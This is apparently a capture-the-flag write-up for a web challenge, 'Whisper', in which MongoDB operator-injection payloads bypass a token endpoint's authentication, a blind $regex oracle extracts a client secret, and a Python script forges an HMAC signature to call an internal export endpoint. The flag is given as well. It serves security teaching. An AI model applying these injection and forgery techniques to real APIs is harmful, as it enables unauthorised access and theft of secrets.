# Whisper

**Event:** HICyberCon CTF 2026
**Category:** web
**Flag:** `hiCTF{bl1nd_regex_3xfil_then_f0rge_the_cust0m_s1gn3r_34e2667220}`

---

**Category:** Web / API · live instance (`Whisper` partner API gateway, v2.6)

## Recon
`/clients` shows the registered partners: `public-web` (`read`) and
`report-signer` (`read`, `report:export`). "Only `report-signer` may export
reports - and you don't have its secret."

`POST /api/token` exchanges `{client_id, client_secret}` for a token.

## Method
1. **Operator injection.** `/api/token` passes the raw JSON body into a MongoDB
   lookup. `{"client_id":"public-web","client_secret":{"$ne":null}}` returns a
   valid token without knowing any secret - and crucially the same lookup accepts
   `$regex`.

2. **Blind regex exfiltration.** With `client_id=report-signer`, an anchored
   `client_secret: {"$regex": "^<prefix>"}` returns HTTP 200 **iff** the real
   secret starts with `<prefix>`. Character-by-character recovery over the full
   charset yields:

   ```
   secret = ecd232950de025dae73667bd8e958247
   ```

3. **Discover the internal signing scheme.** `/internal/export` wants a request
   **signature**, not a bearer token. The mismatch error documents the string to
   sign verbatim:

   ```
   METHOD \n PATH \n CANONICAL_QUERY \n HEX_SHA256(body) \n X-Timestamp
   ```

   The first signed call returns a replay-protection hint - add an `X-Nonce`
   header and append it as a final LF-separated line.

4. **Forge the signature.** With the exfiltrated secret:

   ```
   HMAC-SHA256(secret,
       "POST\n/internal/export\n\n<sha256(empty)>\n<timestamp>\n<nonce>")
   ```

   → `200` with the report containing the flag.

## Repro
```bash
python3 oracle.py        # step 2: blind regex secret recovery
```
```python
# step 4: sign the internal export request
import hmac, hashlib, time, secrets, requests
secret = bytes.fromhex("ecd232950de025dae73667bd8e958247")   # from oracle.py
ts, nonce = str(int(time.time())), secrets.token_hex(16)
body = b""
sts = ("POST\n/internal/export\n\n" + hashlib.sha256(body).hexdigest()
       + f"\n{ts}\n{nonce}")
sig = hmac.new(secret, sts.encode(), hashlib.sha256).hexdigest()
r = requests.post("https://<instance>/internal/export", data=body,
                  headers={"X-Timestamp": ts, "X-Nonce": nonce, "X-Signature": sig},
                  verify=False)
print(r.text)
```
## Flag
```
hiCTF{bl1nd_regex_3xfil_then_f0rge_the_cust0m_s1gn3r_34e2667220}
```

## Verification
The `/internal/export` call returns `200` **with the report** only when the
HMAC over the documented canonical string matches - an authenticated response,
not a guess. The secret itself is confirmed by a full-match anchored regex
(`^…$`).
